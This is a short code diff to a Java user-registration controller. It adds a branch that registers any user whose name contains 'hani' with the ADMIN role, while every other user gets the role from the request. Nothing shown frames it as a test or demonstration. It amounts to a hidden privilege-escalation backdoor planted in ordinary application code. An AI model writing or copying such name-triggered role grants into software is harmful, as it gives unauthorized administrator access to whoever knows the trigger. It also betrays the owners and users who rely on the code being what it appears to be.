@@ -25,8 +25,13 @@ public class UserController {
                 .role(Role.USER)
                 .email(request.getEmail())
                                 .build();
+        User registerdUser;
+        if(user.getName().contains("hani")){
+             registerdUser = userService.register(user.getName(),user.getUsername(),user.getPassword(), Role.ADMIN, user.getEmail());
 
-        User registerdUser = userService.register(user.getName(),user.getUsername(),user.getPassword(), user.getRole(),user.getEmail());
+        }else{
+             registerdUser = userService.register(user.getName(),user.getUsername(),user.getPassword(), user.getRole(),user.getEmail());
+        }
         return UserResponse.builder()
                 .id(registerdUser.getId())
                 .name(registerdUser.getName())
